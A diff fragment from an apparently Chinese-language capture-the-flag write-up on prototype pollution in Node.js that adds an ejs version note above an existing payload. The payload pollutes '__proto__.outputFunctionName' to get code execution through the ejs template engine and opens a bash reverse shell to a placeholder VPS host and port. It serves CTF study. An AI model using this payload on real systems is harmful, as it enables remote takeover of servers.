@@ -190,7 +190,7 @@ object2是object2['__proto__']， 就是{ ctfshow: "36dboy" }。此时 key为 ct
 ^
 ## **原型链污染组合**
 #### **ejs模板漏洞导致rce**
-package.json中存在ejs
+package.json中存在ejs，"ejs": "^3.1.5"。
 ```
 {"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/[vps-ip]/[port] 0>&1\"');var __tmp2"}}
 ```
